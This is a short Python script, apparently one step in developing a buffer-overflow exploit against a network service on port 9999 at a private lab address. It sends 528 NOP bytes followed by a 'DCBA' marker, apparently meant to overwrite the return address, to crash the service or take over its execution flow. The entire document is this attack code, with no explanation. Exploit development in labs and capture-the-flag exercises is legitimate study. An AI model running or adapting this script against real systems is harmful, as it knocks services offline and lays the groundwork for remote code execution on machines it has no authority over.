#!/usr/bin/python
import socket
target_address="172.20.10.2"
target_port=9999

buffer = "\x90" * 528
buffer+= "DCBA"
buffer+= "\r\n\r\n"

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(buffer)
sock.close()
